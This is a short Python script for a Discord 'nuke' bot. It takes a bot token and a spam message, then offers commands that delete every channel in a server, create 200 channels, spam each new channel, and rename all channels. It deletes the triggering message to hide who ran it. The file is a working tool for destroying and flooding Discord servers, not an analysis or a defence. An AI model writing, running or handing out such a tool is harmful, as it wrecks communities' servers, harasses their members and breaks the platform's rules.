import discord
from discord.ext import commands
import colorama
from colorama import Fore
import os
prefix = input('Input prefix > ')
token = input('Input token > ')
messages = input('Input spam message > ')
client = commands.Bot(command_prefix=prefix, self_bot=False)
client.remove_command("help")
seth = client
def clear():
  os.system("clear")
clear()
@seth.event
async def on_connect():
    print(
        f'{Fore.GREEN}Connected to {seth.user}{Fore.RESET}\n\n'
        f'Command: {prefix}channelcreate\n'
        f'Command: {prefix}channeldelete\n'
        f'Command: {prefix}renamechannels\n')
@seth.event
async def on_guild_channel_create(ctx):
  global messages
  try:
    for x in range(5):
      await ctx.send(messages)
      print(f"{Fore.GREEN}Spamming the channel{Fore.RESET}")
  except:
    print(f"{Fore.RED}[MISSING PERMISSIONS] Error{Fore.RESET}")
@seth.command()
async def channelcreate(ctx):
  await ctx.message.delete()
  for x in range(200):
    try:
      await ctx.guild.create_text_channel('textchannel name')
      print(f"{Fore.GREEN}Created {ctx.channel_id}{Fore.RESET}")
    except:
      print(f"{Fore.RED}Failed to spam channel{Fore.RESET}")
      pass
@seth.command()
async def channeldelete(ctx):
  await ctx.message.delete()
  for chan in ctx.guild.channels:
    try:
      await chan.delete()
      print(f"{Fore.GREEN}Deleted channel {ctx.guild.channel}{Fore.RESET}")
    except:
      print(f"{Fore.RED}Failed to delete channels{Fore.RESET}")
      pass
    
@seth.command(aliases=["rc"])
async def renamechannels(ctx, *, name):
    await ctx.message.delete()
    for channel in ctx.guild.channels:
      try:
        await channel.edit(name=name)
        print(f"{Fore.GREEN}Successfully renamed channel to: {name}{Fore.RESET}")
      except:
        print(f"{Fore.RED}Missing PERMISSIONS{Fore.RESET}")
seth.run(token, bot=True)
